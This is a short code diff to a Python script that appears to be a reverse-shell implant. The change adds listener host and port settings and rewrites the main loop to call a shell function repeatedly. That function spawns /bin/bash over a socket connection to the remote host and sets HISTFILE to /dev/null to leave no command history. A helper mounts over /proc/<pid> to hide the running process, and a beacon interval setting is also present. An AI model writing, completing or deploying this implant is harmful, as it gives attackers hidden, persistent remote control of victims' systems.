@@ -16,14 +16,11 @@ pid = getpid()
 
 TMP_DIR = ''
 BEACON_INTERVAL = 0
+LHOST = ""
+LPORT = 0
 
 
 def PROC_HIDE_CMD(): return f'mount -o {TMP_DIR} /proc/{pid}'
-
-
-while True:
-    if input() == "exit":
-        break
 
 
 def shell(lhost, lport):
@@ -35,3 +32,8 @@ def shell(lhost, lport):
     putenv("HISTFILE", '/dev/null')
     spawn("/bin/bash")
     s.close()
+
+while True:
+    shell(LHOST, LPORT)
+    if input() == "exit":
+        break
